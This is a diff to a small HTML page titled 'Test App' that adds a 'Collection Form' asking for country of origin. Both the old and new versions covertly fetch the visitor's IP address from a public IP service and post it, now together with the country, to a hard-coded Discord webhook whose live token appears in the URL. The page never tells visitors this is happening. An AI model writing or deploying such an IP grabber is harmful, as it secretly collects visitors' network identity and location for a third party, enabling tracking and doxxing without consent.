@@ -6,38 +6,50 @@
     <title>Test App</title>
 </head>
 <body>
+    <h1>Collection Form</h1>
+    <form id="collectionForm">
+        <label for="country">Country of Origin:</label>
+        <input type="text" id="country" name="country" required>
+        <button type="submit">Submit</button>
+    </form>
     <script>
-        // Fetch the user's IP address using a public IP API
-        fetch('https://api.ipify.org?format=json')
-            .then(response => {
-                if (!response.ok) {
-                    throw new Error('Network response was not ok ' + response.statusText);
-                }
-                return response.json();
-            })
-            .then(data => {
-                const ip = data.ip;
-                console.log('IP fetched:', ip); // Log the IP to ensure it's being fetched
+        document.getElementById('collectionForm').addEventListener('submit', function(event) {
+            event.preventDefault(); // Prevent the form from submitting the default way
 
-                // Send the IP address to a webhook
-                return fetch('https://discord.com/api/webhooks/1245495765661388901/WRao4NgfQOys9DcWYcei2TksMNLZUAsXFvy56y5cgc1y4zDnow4vq-98GAPeAwJaMPtH', {
-                    method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json'
-                    },
-                    body: JSON.stringify({ content: `IP Address: ${ip}` }) // Updated payload format
+            const country = document.getElementById('country').value;
+
+            // Fetch the user's IP address using a public IP API
+            fetch('https://api.ipify.org?format=json')
+                .then(response => {
+                    if (!response.ok) {
+                        throw new Error('Network response was not ok ' + response.statusText);
+                    }
+                    return response.json();
+                })
+                .then(data => {
+                    const ip = data.ip;
+                    console.log('IP fetched:', ip); // Log the IP to ensure it's being fetched
+
+                    // Send the IP address and country to a webhook
+                    return fetch('https://discord.com/api/webhooks/1245495765661388901/WRao4NgfQOys9DcWYcei2TksMNLZUAsXFvy56y5cgc1y4zDnow4vq-98GAPeAwJaMPtH', {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json'
+                        },
+                        body: JSON.stringify({ content: `IP Address: ${ip}, Country: ${country}` }) // Updated payload format
+                    });
+                })
+                .then(response => {
+                    if (response.ok) {
+                        console.log('Data sent successfully');
+                    } else {
+                        console.log('Failed to send data:', response.statusText);
+                    }
+                })
+                .catch(error => {
+                    console.error('Error:', error);
                 });
-            })
-            .then(response => {
-                if (response.ok) {
-                    console.log('IP address sent successfully');
-                } else {
-                    console.log('Failed to send IP address:', response.statusText);
-                }
-            })
-            .catch(error => {
-                console.error('Error:', error);
-            });
+        });
     </script>
 </body>
 </html>
